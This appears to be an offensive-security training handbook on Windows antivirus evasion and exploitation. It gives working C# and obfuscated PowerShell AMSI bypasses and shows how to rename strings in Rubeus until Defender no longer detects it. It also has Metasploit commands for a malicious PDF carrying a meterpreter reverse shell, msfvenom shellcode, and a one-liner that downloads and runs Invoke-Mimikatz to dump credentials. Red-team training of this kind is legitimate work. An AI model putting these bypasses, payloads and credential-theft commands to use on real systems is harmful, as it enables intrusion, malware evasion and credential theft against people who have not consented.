<li><strong>Targeting <code>amsiInitFailed</code>:</strong> The code specifically targets the <code>amsiInitFailed</code> static field within the <code>System.Management.Automation.AmsiUtils</code> class. This field is used to indicate whether the AntiMalware Scan Interface (AMSI) initialization has failed.</li>
<li><strong>Setting to <code>$true</code>:</strong> By setting this field to <code>$true</code>, the code effectively tells the .NET runtime that AMSI initialization has failed, causing AMSI scans to be skipped.</li>
</ul>
<p><strong>How it Works in .NET Binaries:</strong></p>
<ol>
<li><strong>Locating <code>AmsiUtils</code>:</strong> Just like in PowerShell, you can use reflection in C# (or other .NET languages) to locate the <code>System.Management.Automation.AmsiUtils</code> class.</li>
<li><strong>Accessing <code>amsiInitFailed</code>:</strong> You can then use reflection to access the <code>amsiInitFailed</code> static field.</li>
<li><strong>Setting the Value:</strong> Finally, you can use reflection to set the value of the <code>amsiInitFailed</code> field to <code>true</code>.</li>
</ol>
<p><strong>C# Example:</strong></p>
<pre><code class="language-csharp">using System;
using System.Reflection;

public class AmsiBypass
{
    public static void Main(string[] args)
    {
        try
        {
            // Get the AmsiUtils type
            Type amsiUtilsType = typeof(System.Management.Automation.AmsiUtils);

            // Get the amsiInitFailed field
            FieldInfo amsiInitFailedField = amsiUtilsType.GetField(&quot;amsiInitFailed&quot;, BindingFlags.NonPublic | BindingFlags.Static);

            // Set the amsiInitFailed field to true
            if (amsiInitFailedField != null)
            {
                amsiInitFailedField.SetValue(null, true);
                Console.WriteLine(&quot;AMSI bypassed.&quot;);
            }
            else
            {
                Console.WriteLine(&quot;amsiInitFailed field not found.&quot;);
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine($&quot;Error: {ex.Message}&quot;);
        }
    }
}
</code></pre>
<h2><a class="header" href="#key-considerations" id="key-considerations">Key Considerations:</a></h2>
<ul>
<li><strong>Assembly Loading:</strong>
<ul>
<li>If your .NET binary doesn't already have <code>System.Management.Automation.dll</code> loaded, you may need to load it explicitly using <code>Assembly.Load()</code> or related methods.</li>
</ul>
</li>
<li><strong>.NET Version Compatibility:</strong>
<ul>
<li>Ensure that the reflection code is compatible with the .NET Framework or .NET Core/.NET 5+ version that the target binary is using.</li>
</ul>
</li>
<li><strong>Security Implications:</strong>
<ul>
<li>AMSI bypass techniques can be used for malicious purposes. Use them responsibly and ethically.</li>
</ul>
</li>
<li><strong>EDR Detection:</strong>
<ul>
<li>Modern EDR solutions are designed to detect such reflection-based attacks. They often monitor for suspicious memory modifications and code behavior.</li>
</ul>
</li>
<li><strong>Finding the correct assembly:</strong>
<ul>
<li>In some .net applications, the <code>System.Management.Automation.dll</code> may not be loaded. If this is the case, you will need to load it.</li>
</ul>
</li>
</ul>
<p><strong>In summary:</strong> The AMSI bypass technique using reflection is not limited to PowerShell and can be successfully implemented in .NET binaries.</p>
<hr />
<h1><a class="header" href="#dotnet-packing" id="dotnet-packing">dotnet packing</a></h1>
<p>ConfuserEx
Babel</p>
<hr />
<p>https://github.com/pracsec/AmsiScanner/tree/main/src</p>
<h1><a class="header" href="#static-analysis" id="static-analysis">Static Analysis</a></h1>
<p>Let's take a common attack tool &quot;Rubeus&quot;, compile it and see what Defender thinks of it.</p>
<p><a href="https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s">https://www.youtube.com/watch?v=sP2XH8YI20c&amp;t=1042s</a></p>
<p><a href="https://github.com/GhostPack/Rubeus.git">https://github.com/GhostPack/Rubeus.git</a></p>
<p>https://github.com/gatariee/gocheck/releases</p>
<p>On your windows machine:</p>
<pre><code class="language-powershell">cd git
git clone https://github.com/GhostPack/Rubeus.git
</code></pre>
<p><img src="./images/rubeus_git.jpg" alt="Screenshot" /></p>
<p>Let's compile this with <mark>Visual Studio 2022</mark></p>
<p><img src="./images/rubeus_vs.jpg" alt="Screenshot" /></p>
<p>Browse to your Rubeus solution file (C:\git\Rubeus)</p>
<p><img src="./images/rubeus_sln.jpg" alt="Screenshot" /></p>
<p>select the Program.cs file on the right side in your <code>Solution Explorer</code></p>
<p><img src="./images/rubeus_prg.jpg" alt="Screenshot" /></p>
<p>In order to compile let's change &quot;debug&quot; to &quot;release&quot; and compile as a x64 bit application. Click on &quot;Configuration Manager&quot;, </p>
<p><img src="./images/rubeus_config.jpg" alt="Screenshot" /></p>
<p><img src="./images/rubeus_x64.jpg" alt="Screenshot" /></p>
<p>Save the project, and let's compile (build).</p>
<p><img src="./images/rubeus_build.jpg" alt="Screenshot" /></p>
<p><img src="./images/rubeus_output.jpg" alt="Screenshot" /></p>
<p>Let's see if it works by running rubeus with a simple command:</p>
<p><img src="./images/rubeus_logon.jpg" alt="Screenshot" /></p>
<p>If we copy the file to our &quot;C:\&quot; directory, we'll see that Defender immediately detects it as malicious!!!</p>
<p><img src="./images/rubeus_detected.jpg" alt="Screenshot" /></p>
<blockquote>
<p><em><strong>HINT :</strong></em> Defender didn't detect this as malicious when we compiled it since we made some ,<mark>exclusions</mark> (&quot;C:\Git&quot;, &quot;C:\Temp&quot;, &quot;C:\Desktop&quot;, ...) in Defender to avoid scanning those directories, you can check the exclusions with the following powershell command:</p>
</blockquote>
<pre><code class="language-powershell">Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
</code></pre>
<p>So now what, how did Defender exactly detect this file as malicious, as we can see it was scanned upon being written to disk - this is static (signature based detection), we'll need to make some changes to our source code to bypass these signatures.</p>
<p>We'll use <em><strong>GoCheck</strong></em> (based of DefenderCheck and ThreatCheck) to analyze our rubeus file.</p>
<p>Open a new powershell prompt and type the following command:</p>
<pre><code class="language-powershell">gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
</code></pre>
<p><img src="./images/rubeus_gocheck_token.jpg" alt="Screenshot" /></p>
<p>We can see exactly which strings has caused Defender to detect this as malicious, <mark>ticket</mark>. So all we have to do is go back to our Visual Studio source code and find/replace all TICKET strings by something else, i.e. &quot;<em><strong>token</strong></em>&quot;.</p>
<p><img src="./images/rubeus_replace.jpg" alt="Screenshot" /></p>
<p>Make sure you select the &quot;Look in&quot; to <em><strong>Entire Solution</strong></em>, and click &quot;Replace All&quot;.</p>
<p><img src="./images/rubeus_replace_ticket.jpg" alt="Screenshot" />
<img src="./images/rubeus_replaced_ticket.jpg" alt="Screenshot" /></p>
<p>We can see 1294 References have been renamed. Save the file and let's <code>REBUILD</code> the solution. </p>
<p><img src="./images/rubeus_rebuild_token.jpg" alt="Screenshot" /></p>
<p>And now we'll scan it with GoCheck again:</p>
<pre><code class="language-powershell">gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
</code></pre>
<p><img src="./images/rubeus_gocheck_tokenfixed.jpg" alt="Screenshot" /></p>
<p>We can see there old detection for TICKET is gone, but we have a new one: <mark>DiffieHellmanKey</mark>, alright let's fix that one, just like we did before.</p>
<p>Open Find/Replace and change DiffieHellmanKey to &quot;<em><strong>dhkey</strong></em>&quot;. Save the project, rebuild and let's scan again with GoCheck (it should replace 12 occurrences).</p>
<p><img src="./images/rubeus_gocheck_impuser.jpg" alt="Screenshot" /></p>
<p><strong>Another hit :</strong> <mark>impersonateuser</mark>,  we'll replace this with &quot;<em><strong>impuser</strong></em>&quot;. (it should replace 7 occurrences). Save the file and let's <code>REBUILD</code> the solution, and scan again with GoCheck.</p>
<pre><code class="language-powershell">gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
</code></pre>
<p><img src="./images/rubeus_gocheck_b64.jpg" alt="Screenshot" /></p>
<p><strong>Another one?</strong> Now defender seems to dislike <mark>base64</mark>. We need to be careful with replacing this as there are functions using base64 as part of the name (i.e. Frombase64String). Let's replace this with <em><strong>base_64</strong></em>, but selecting &quot;match word&quot; to avoid renaming functions and breaking our application. (it should replace 78 occurrences)</p>
<p><img src="./images/rubeus_b64.jpg" alt="Screenshot" /></p>
<p>Save the file and let's <code>REBUILD</code> the solution, and scan again with GoCheck.</p>
<p><img src="./images/rubeus_gocheck_clean.jpg" alt="Screenshot" /></p>
<p>Tadaa!!!! Victory!!! No more detections, we can now drop the clean rubeus file to our &quot;C:\&quot; drive and defender won't detect it. Let's try:</p>
<p><img src="./images/rubeus_defenderscan.jpg" alt="Screenshot" /></p>
<h2><a class="header" href="#img-srcimagesrubeus_defender_cleanjpg-altscreenshot-" id="img-srcimagesrubeus_defender_cleanjpg-altscreenshot-"><img src="./images/rubeus_defender_clean.jpg" alt="Screenshot" /></a></h2>
<p>https://github.com/Matthew-IE/XObfuscator.git
add to Havoc C2</p>
<p>strings, threatcheck, gocheck, floss, yara</p>
<p>C:\Temp&gt;gocheck64.exe C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe --defender
c:\Git\ThreatCheck\ThreatCheck\bin\x64\Release&gt;ThreatCheck.exe -f C:\Git\Rubeus\Rubeus\bin\x64\Release\Rubeus.exe</p>
<h1><a class="header" href="#yara" id="yara">YARA</a></h1>
<p>Let's first install YARA support in VSCODE</p>
<p><img src="./images/yaracode.jpg" alt="Screenshot" /></p>
<pre><code class="language-yara">rule PE_Detected
{
    meta:
        description = &quot;Detects 'MZ header'&quot;
        author = &quot;Peter Girnus&quot;
            web = &quot;https://www.petergirnus.com/blog&quot;

    condition:
        uint16(0) == 0x5a4d
}
</code></pre>
<p><mark>Marked text</mark></p>
<p>Run strings on NativeDump
HxD or XXD on NativeDump.exe</p>
<p>LitterBox</p>
<p>threatcheck/GoCheck on rubeus (make sure defender execption is off for the folder both files are located)</p>
<p>Check output threatcheck/gocheck</p>
<p>erase with 0x00's</p>
<p>use visual studio find all/replace all (match word)</p>
<hr />
<h1><a class="header" href="#notes" id="notes">Notes</a></h1>
<p>install code </p>
<p>install sdk (<a href="https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-9.0.201-windows-x64-installer">https://dotnet.microsoft.com/en-us/download/dotnet/thank-you/sdk-9.0.201-windows-x64-installer</a>)</p>
<p>install C# Dev Kit and .NET Install Tool extensions from the VS Code marketplace.</p>
<p><img src="./images/code_csharpdev.jpg" alt="Screenshot" /></p>
<p><img src="./images/code_csharinstalltool.jpg" alt="Screenshot" /></p>
<p>How to make a new project:</p>
<pre><code class="language-csharp">dotnet new console -n MyApp
cd MyApp
dotnet build
dotnet run
</code></pre>
<h1><a class="header" href="#chapter-11---metasploit-basics" id="chapter-11---metasploit-basics">Chapter 1.1 - Metasploit Basics</a></h1>
<p>Log on to your Unbuntu VM with <strong>admin/admin</strong>, open a terminal prompt and start the metasploit console:</p>
<pre><code class="language-code">msfconsole
</code></pre>
<p><img src="./images/01_metasploit.jpg" alt="Screenshot" /></p>
<p>We're going to create a <code>malicious PDF</code> file which contains a meterpreter backdoor that sets up a reverse shell on port 12345. This attack requires an exploit on Adobe PDF, let's have a look which exploits are available within Metasploit to accomplish this.</p>
<pre><code class="language-code">search type:exploit platform:windows adobe pdf
</code></pre>
<p><img src="./images/02_metasploit.jpg" alt="Screenshot" /></p>
<p>As you can see these are all pretty old exploits, but they will do for our proof on concept. There are numerous or PDF readers (such as Foxit, Slim PDF, Nitro and others). New vulnerabilities come out every day and this shows how important keeping your 3rd party applications up to date is.</p>
<p>For now we're going to continue with <strong>adobe_pdf_embedded_exe</strong>.</p>
<pre><code class="language-code">use exploit/windows/fileformat/adobe_pdf_embedded_exe
</code></pre>
<p>We're going to create a simple windows <em>reverse TCP</em> payload that will connect back to our Ubuntu server on <em>Port 12345</em>. This payload will be embedded into the pdf.</p>
<pre><code class="language-code">set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.18.204
set LPORT 12345
exploit
</code></pre>
<p><img src="./images/03_metasploit.jpg" alt="Screenshot" /></p>
<p>Next step is to set up metasploit to listen to reverse TCP connections on port 12345:</p>
<p><img src="./images/04_metasploit.jpg" alt="Screenshot" /></p>
<pre><code class="language-code">back
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.18.204
set LPORT 12345
run
</code></pre>
<p>Open a new terminal window on your Ubuntu and copy your &quot;<strong>evil.pdf</strong>&quot; payload to &quot;/temp&quot;.</p>
<blockquote>
<p><strong><em>NOTE:</em></strong>  Remember to do this as super user, the root directory requires admin privileges. You can do this by typing &quot;<strong>sudo -i</strong>&quot; and entering your password.</p>
</blockquote>
<p><img src="./images/06_copypayload.jpg" alt="Screenshot" /></p>
<pre><code class="language-code">sudo -i
cd /root/.msfconsole/local/
ls -la
cp evil.pdf /temp
</code></pre>
<p>Now let's pivot to our Windows client and download the malicious PDF, we'll be using WinSCP - to transfer our &quot;evil.pdf&quot; from &quot;/temp&quot; to our windows desktop.</p>
<blockquote>
<p><strong><em>NOTE:</em></strong>  Create a new Site in WinSCP, File Protocol = SCP, Port Number =22, Username = admin, Password = admin. In the advanced options you can specify the default starting direcotry, put &quot;/temp&quot; there. Save the connection for later use. Connect to the Ubuntu manchine with WinSCP and download &quot;evil.pdf&quot; to your desktop.</p>
</blockquote>
<p><img src="./images/05_winscp.jpg" alt="Screenshot" /></p>
<p>Once the file is copied to your desktop, right-click the evil.pfd file and select open with &quot;Adobe Reader 9.0&quot;. Remember we are using an old version of adobe that is still vulnerable for this exploit.</p>
<p><img src="./images/07_rightclick.jpg" alt="Screenshot" /></p>
<p><img src="./images/8_adobe_1.jpg" alt="Screenshot" /></p>
<p><img src="./images/9_adobe_2.jpg" alt="Screenshot" /></p>
<p><img src="./images/10_session.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#shellcode" id="shellcode">Shellcode</a></h1>
<h2><a class="header" href="#--what-is-position-independent-code-shellcode" id="--what-is-position-independent-code-shellcode">[-] What is Position Independent Code (Shellcode)?</a></h2>
<p>Position Independent Code is code that is designed to execute regardless of where it resides in memory. This is in contrast to most programs, which might need to be loaded at a specific address to function correctly. Shellcode is a type of PIC, often written for exploits and payloads in hacking.</p>
<p>The term “Shellcode” originally referred to code that, when executed, would spawn a command shell — hence the name. However, today, it generally refers to any payload used for exploitation.</p>
<h3><a class="header" href="#--uses-of-shellcode" id="--uses-of-shellcode">[-] Uses of Shellcode:</a></h3>
<p><em><strong>Exploitation</strong></em>: The primary use of shellcode is to exploit vulnerabilities in software, where the attacker can inject and execute their code.
<em><strong>Payloads</strong></em>: Once a vulnerability is exploited, shellcode can be used to deliver payloads, which can range from spawning a reverse shell to injecting ransomware or establishing persistence.
<em><strong>Bypassing Restrictions</strong></em>: Shellcode can be crafted to bypass security mechanisms, making detection and mitigation difficult.</p>
<h3><a class="header" href="#--shellcode-vs-compiled-code-vs-interpreted-code" id="--shellcode-vs-compiled-code-vs-interpreted-code">[-] Shellcode vs. Compiled Code vs. Interpreted Code:</a></h3>
<p><em><strong>Shellcode</strong></em>: As mentioned, shellcode is position-independent, designed to run from any location in memory. It doesn’t rely on external libraries or functions and should be small and efficient to work within the constraints of an exploit.</p>
<p><em><strong>Compiled Code</strong></em>: This is code written in languages like C or C++ that is then compiled into machine code by a compiler. The result is a binary executable that the system can run. Unlike shellcode, compiled programs often rely on fixed memory addresses and external libraries.</p>
<p><em><strong>Interpreted Code</strong></em>: This is code written in languages like Python, Ruby, or JavaScript that is executed line-by-line by an interpreter. It’s not converted into machine code; instead, the interpreter reads and executes it directly. This makes it generally slower than compiled code, but it’s more flexible and platform-independent.</p>
<p>PE-File vs Shellcode</p>
<pre><code class="language-bash">msfvenom -a x64 --platform windows -p windows/x64/exec CMD=calc.exe -f c                                            
No encoder specified, outputting raw payload
Payload size: 276 bytes
Final size of c file: 1188 bytes
unsigned char buf[] = 
&quot;\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50&quot;
&quot;\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52&quot;
&quot;\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a&quot;
&quot;\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41&quot;
&quot;\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52&quot;
&quot;\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48&quot;
&quot;\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40&quot;
&quot;\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48&quot;
&quot;\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41&quot;
&quot;\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1&quot;
&quot;\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c&quot;
&quot;\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01&quot;
&quot;\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a&quot;
&quot;\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b&quot;
&quot;\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00&quot;
&quot;\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b&quot;
&quot;\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd&quot;
&quot;\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0&quot;
&quot;\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff&quot;
&quot;\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;;
</code></pre>
<h1><a class="header" href="#using-donut-to-convert-a-pe-to-shellcode" id="using-donut-to-convert-a-pe-to-shellcode">USing DONUT to convert a PE to Shellcode</a></h1>
<pre><code class="language-powershell">donut.exe -e 1 -a x64 -o shellcode.donut -f 3 -i calcloader.exe -z 1 -b 1 -k 2
</code></pre>
<p>In a Portable Executable (PE) file, the <code>unsigned char shellcode[]</code> array is typically stored in the <code>.data</code> section. This section is used for storing initialized global and static variables. The <code>.data</code> section is marked as readable and writable.</p>
<p>Here's a brief overview of the relevant sections in a PE file:</p>
<ul>
<li><strong>.text</strong>: Contains the executable code.</li>
<li><strong>.data</strong>: Contains initialized global and static variables.</li>
<li><strong>.bss</strong>: Contains uninitialized global and static variables.</li>
<li><strong>.rdata</strong>: Contains read-only data, such as string literals and constants.</li>
</ul>
<p>Since <code>shellcode</code> is an initialized global variable, it will be placed in the <code>.data</code> section of the PE file.</p>
<p>To summarize, the <code>unsigned char shellcode[]</code> array in your code will be stored in the <code>.data</code> section of the PE file.</p>
<p>Let's open CFF Explorer and dump the <code>data section</code>.</p>
<p><img src="./images/cff_datasection.jpg" alt="image" /></p>
<p>And open that file in Hexdump:</p>
<p><img src="./images/hexdump_shell.jpg" alt="image" /></p>
<p>Let's have a look, lets open powershell and run our loader.</p>
<p><img src="./images/powershell_memloc.jpg" alt="image" /></p>
<p>Then attach <code>x64dbg</code> to the localloader.exe and check for those two memory locations:</p>
<p><img src="./images/xdbg_mem.jpg" alt="image" /></p>
<p><img src="./images/xdbg_string.jpg" alt="image" /></p>
<p><img src="./images/procmon_dlls.jpg" alt="image" /></p>
<p><img src="./images/procmon_rwx.jpg" alt="image" /></p>
<h2><a class="header" href="#img-srcimagesprocmon_shellcodejpg-altimage-" id="img-srcimagesprocmon_shellcodejpg-altimage-"><img src="./images/procmon_shellcode.jpg" alt="image" /></a></h2>
<pre><code>**What is AMSI/Dotnet (managed/unmanaged code)**
    The .NET Framework provides the Assembly.Load method which allows loading Common Object 
    File Format (COFF) images like such as DLL’s and EXE’s. Assembly.Load can be supplied 
    with a file path to load a DLL from disk, or with a byte array to load directly in memory.

Threatcheck/AMSI Trigger

ClamAV
    dotpeek/hexdump --canonical
    strings -n 5
</code></pre>
<p>Shelcode formats (shellcode formatter etc)</p>
<blockquote>
<p>OPSEC HINT: Make sure your binaries loog legit, add metadata and and icon to the file!</p>
</blockquote>
<p>On Windows (requires SDK):
<a href="https://dotnet.microsoft.com/en-us/">https://dotnet.microsoft.com/en-us/</a></p>
<h2><a class="header" href="#cscexe-csharpdotnet" id="cscexe-csharpdotnet"><em><strong>csc.exe (CSharp/dotnet)</strong></em></a></h2>
<pre><code class="language-code">c:\windows\Microsoft.NET\Framework\v3.5\bin\csc.exe /t:exe /out:loader.exe loader.cs
csc.exe /t:exe /out:$utilName /unsafe $katzPath
</code></pre>
<pre><code class="language-csharp">// AssemblyInfo.cs
[assembly: AssemblyTitle(&quot;YourProductName&quot;)]
[assembly: AssemblyDescription(&quot;Some description&quot;)]
[assembly: AssemblyConfiguration(&quot;&quot;)]
[assembly: AssemblyCompany(&quot;YourCompanyName&quot;)]
[assembly: AssemblyProduct(&quot;YourProductName&quot;)]
[assembly: AssemblyCopyright(&quot;© YourCompanyName&quot;)]
[assembly: AssemblyTrademark(&quot;&quot;)]
[assembly: AssemblyCulture(&quot;&quot;)]
[assembly: AssemblyVersion(&quot;1.0.0.0&quot;)]
[assembly: AssemblyFileVersion(&quot;1.0.0.0&quot;)]
</code></pre>
<pre><code class="language-powershell">csc -out:evil.exe -optimize- -win32icon:app.ico Program.cs AssemblyInfo.cs
</code></pre>
<p>You can extract metadata from any binary with this simple program.</p>
<pre><code class="language-powershell">dotnet new console -n AssemblyInfoExtractor
cd AssemblyInfoExtractor
</code></pre>
<p>Create a &quot;Program.cs&quot; file here</p>
<pre><code class="language-csharp">using System;
using System.Reflection;

namespace AssemblyInfoExtractor
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine(&quot;Please provide the path to the assembly.&quot;);
                return;
            }

            string assemblyPath = args[0];
            try
            {
                var assembly = Assembly.LoadFile(assemblyPath);
                var assemblyName = assembly.GetName();

                Console.WriteLine($&quot;Assembly Full Name: {assemblyName.FullName}&quot;);
                Console.WriteLine($&quot;Version: {assemblyName.Version}&quot;);

                var attributes = assembly.GetCustomAttributesData();
                foreach (var attr in attributes)
                {
                    if (attr.AttributeType == typeof(AssemblyCompanyAttribute))
                    {
                        Console.WriteLine($&quot;Company: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyProductAttribute))
                    {
                        Console.WriteLine($&quot;Product: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyCopyrightAttribute))
                    {
                        Console.WriteLine($&quot;Copyright: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyTitleAttribute))
                    {
                        Console.WriteLine($&quot;Title: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                    if (attr.AttributeType == typeof(AssemblyDescriptionAttribute))
                    {
                        Console.WriteLine($&quot;Description: {attr.ConstructorArguments[0].Value}&quot;);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($&quot;Error: {ex.Message}&quot;);
            }
        }
    }
}
</code></pre>
<pre><code class="language-powershell">dotnet build
dotnet run --project C:\Temp\AssemblyInfoExtractor\AssemblyInfoExtractor.csproj C:\Temp\LocalLoader.exe
</code></pre>
<p>or run the exe:</p>
<pre><code class="language-powershell">C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;dir
 Volume in drive C is Windows
 Volume Serial Number is 368D-BFAA

 Directory of C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0

02/21/2025  04:35 PM    &lt;DIR&gt;          .
02/21/2025  04:35 PM    &lt;DIR&gt;          ..
02/21/2025  04:31 PM               455 AssemblyInfoExtractor.deps.json
02/21/2025  04:35 PM             6,656 AssemblyInfoExtractor.dll
02/21/2025  04:35 PM           145,408 AssemblyInfoExtractor.exe
02/21/2025  04:35 PM            11,080 AssemblyInfoExtractor.pdb
02/21/2025  04:31 PM               268 AssemblyInfoExtractor.runtimeconfig.json
               5 File(s)        163,867 bytes
               2 Dir(s)   2,280,939,520 bytes free

C:\Temp\AssemblyInfoExtractor\bin\Debug\net9.0&gt;AssemblyInfoExtractor.exe C:\Temp\LocalLoader.exe
Assembly Full Name: LocalLoader, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
Version: 1.0.0.0
Title: LocalLoader
Description:
Company:
Product: LocalLoader
Copyright: Copyright ©  2025
</code></pre>
<h2><a class="header" href="#msbuildexe-csharp-c" id="msbuildexe-csharp-c"><em><strong>msbuild.exe (CSharp, C++)</strong></em></a></h2>
<pre><code class="language-code">msbuild buildapp.csproj -t:HelloWorld
msbuild mimidogz.sln /t:Build /p:Configuration=Release /p:Platform=x64
</code></pre>
<pre><code class="language-code">@echo off
set msBuildExe=&quot;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe&quot;
set solutionsFile=&quot;C:\TestProject\mySln.sln&quot;
rem Build the solutions:  
%msBuildExe% /t:Build /p:Configuration=Release /p:Platform=x64 %solutionsFile%
</code></pre>
<hr />
<h2><a class="header" href="#clexe-c-visual-studio" id="clexe-c-visual-studio"><em><strong>CL.exe (C)</strong></em> Visual Studio</a></h2>
<pre><code class="language-code">Developer Prompt Visual Studio
cl.exe hello.c /out:hello.exe /exe

git clone https://github.com/gentilkiwi/mimikatz.git

cl.exe /Zi /I inc\ mimikatz\modules\misc\kuhl_m_misc_citrix.c modules\kull_m_kernel.c 
modules\kull_m_memory.c modules\kull_m_minidump.c modules\kull_m_output.c 
modules\kull_m_process.c modules\kull_m_string.c lib\x64\ntdll.min.lib 
/link kernel32.lib user32.lib advapi32.lib shell32.lib crypt32.lib rpcrt4.lib vcruntime.lib ucrt.lib 
/entry:kuhl_m_misc_citrix_logonpasswords 
/subsystem:console
</code></pre>
<hr />
<p>Staged vs Stageless</p>
<hr />
<h1><a class="header" href="#a-note-on-compiling" id="a-note-on-compiling">A note on compiling</a></h1>
<p>without code optimisation, all imported functions are show. With code optimization, only virtuallalloc and exitprocess.</p>
<p>The command <code>cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c</code> is used to compile a C source file using the Microsoft Visual C++ (MSVC) compiler. Here's a breakdown of each part of the command:</p>
<ul>
<li>
<p><code>cl</code>: This is the command-line compiler for Microsoft Visual C++.</p>
</li>
<li>
<p><code>/Od</code>: This flag disables optimization. It ensures that the compiler does not perform any optimizations that might remove or alter the code, which is useful for debugging and ensuring that all function calls are preserved.</p>
</li>
<li>
<p><code>/Zi</code>: This flag generates complete debugging information. It creates a Program Database (PDB) file that contains debugging information, which is useful for debugging the executable with a debugger.</p>
</li>
<li>
<p><code>/Fe:local_loader.exe</code>: This flag specifies the name of the output executable file. In this case, it sets the output file name to <code>local_loader.exe</code>.</p>
</li>
<li>
<p>Local_loader_C.c: This is the name of the C source file to be compiled.</p>
</li>
</ul>
<p>Putting it all together, the command compiles the Local_loader_C.c source file into an executable named <code>local_loader.exe</code>, with optimizations disabled and debugging information included.</p>
<p>To run this command, you would typically open a Developer Command Prompt for Visual Studio and execute the command there. Here is an example of how you might run it:</p>
<pre><code class="language-sh">cl /Od /Zi /Fe:local_loader.exe Local_loader_C.c
</code></pre>
<p>After running this command, you can use tools like Dependency Walker to inspect the import table of <code>local_loader.exe</code> and verify that all the expected functions are listed.</p>
<hr />
<pre><code class="language-bash">C:\Lab&gt;dumpbin /imports Local_loader_C.exe
Microsoft (R) COFF/PE Dumper Version 14.42.34436.0
Copyright (C) Microsoft Corporation.  All rights reserved.


Dump of file Local_loader_C.exe

File Type: EXECUTABLE IMAGE

  Section contains the following imports:

    KERNEL32.dll
             140017000 Import Address Table
             140020EC0 Import Name Table
                     0 time date stamp
                     0 Index of first forwarder reference

                         610 WaitForSingleObject
                         232 GetCurrentProcess
                         233 GetCurrentProcessId
                         103 CreateThread
                         5FF VirtualAlloc
                         654 WriteProcessMemory
                         4F5 RtlCaptureContext
                         4FD RtlLookupFunctionEntry
                         504 RtlVirtualUnwind
                         ...
</code></pre>
<p>IEX (New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1&quot;); Invoke-Mimikatz -Command privilege::debug; Invoke-Mimikatz -DumpCreds;</p>
<p>$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils';$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m));$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static');$field.SetValue($null,$true)</p>
<h1><a class="header" href="#chapter-121---win32api-functions-kernel-and-user-mode" id="chapter-121---win32api-functions-kernel-and-user-mode">Chapter 1.2.1 - WIN32api, Functions, kernel and user mode</a></h1>
<p>learn.micorosoft.com</p>
<p>Explain Kernel vs user mode (ntdll.dll, kernel32.dll, kernelbase.dll)</p>
<p>Explain DLL's</p>
<p><img src="./images/function_flow.jpg" alt="Screenshot" /></p>
<p>WIN32 api functions (slides)</p>
<p><img src="./images/function_userkernel.jpg" alt="Screenshot" /></p>
<p>https://malapi.io/</p>
<p>Api monitor
x64dbg</p>
<p><img src="./images/functions_flow.jpg" alt="Screenshot" />
<a href="https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls">https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls</a></p>
<p><img src="./images/functions_virtualalloc.jpg" alt="Screenshot" /></p>
<p><img src="./images/functions_createthread.jpg" alt="Screenshot" /></p>
<p><img src="./images/functions_waitforsingleobject.jpg" alt="Screenshot" /></p>
<p>Let's build a dummy shellcode:</p>
<p>hello world dialog</p>
<p><a href="https://github.com/hasherezade/pe_to_shellcode/releases/tag/v1.2">https://github.com/hasherezade/pe_to_shellcode/releases/tag/v1.2</a></p>
